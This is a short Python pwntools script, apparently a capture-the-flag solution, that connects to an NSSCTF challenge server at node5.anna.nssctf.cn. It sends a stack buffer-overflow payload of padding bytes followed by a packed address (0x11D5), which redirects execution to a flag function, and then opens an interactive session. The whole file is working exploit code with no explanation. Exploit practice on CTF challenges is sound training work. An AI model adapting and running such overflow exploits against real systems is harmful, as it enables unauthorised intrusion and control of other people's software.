from pwn import *

p=remote('node5.anna.nssctf.cn',29489)
flag_addr=0x11D5 
payload=b'a'*(0x1A+8)+p64(flag_addr)
p.sendline(payload)
p.interactive()
